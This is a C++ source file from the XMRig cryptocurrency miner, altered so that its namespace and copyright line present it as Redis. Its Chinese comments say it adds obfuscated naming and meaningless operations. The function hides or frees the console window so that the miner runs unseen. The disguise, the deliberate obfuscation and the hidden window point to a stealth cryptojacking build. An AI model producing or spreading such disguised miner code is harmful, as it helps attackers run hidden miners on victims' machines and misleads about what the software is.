/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
 * Copyright 2016-2019 XMRig       <https://github.com/redis>, <support@redis.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */


#include <winsock2.h>
#include <windows.h>


#include "App.h"
#include "core/Controller.h"


bool redis::App::background(int &param) {
    // 随机变量和混淆的命名
    unsigned char obscureValue = 0x01;
    unsigned char checkValue = 0x00;
    unsigned char resultFlag = 0x02;

    // 对于原始函数，添加无关操作来增加混淆
    volatile bool isHidden = false;
    if (m_controller->isBackground() == false) {
        return checkValue; // 返回 false
    }

    // 混淆部分：不直接使用 hcon
    HWND wndHandle = GetConsoleWindow();
    if (wndHandle) {
        // 使用复杂语法混淆
        ShowWindow(wndHandle, SW_HIDE);
    } else {
        // 更复杂的处理：增加无关的操作
        HANDLE stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
        CloseHandle(stdHandle);
        FreeConsole();
    }

    // 引入无关的逻辑
    if (obscureValue == 1 && resultFlag == 2) {
        isHidden = true; // 无实质影响，仅用于增加复杂度
    }

    return checkValue; // 返回 false
}

